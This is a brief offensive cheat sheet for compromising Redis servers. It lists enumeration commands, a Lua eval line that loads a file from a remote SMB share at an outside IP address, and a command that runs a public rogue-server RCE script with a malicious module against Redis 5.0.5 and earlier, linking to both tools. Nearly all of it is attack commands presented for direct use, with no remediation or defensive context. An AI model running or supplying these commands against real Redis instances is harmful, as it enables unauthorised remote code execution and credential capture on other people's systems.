# Enumeration
```
redis-cli -h ip
config get *
```

# eval 
```
eval "dofile('\\\\\\\\10.21.176.25\\\\teest')" 0
```
# Redis RCE <=5.0.5
```
python3 redis-rce.py -r 127.0.0.1 -L 127.0.0.1 -f exp.so

https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so
https://github.com/Ridter/redis-rce/blob/master/redis-rce.py
```
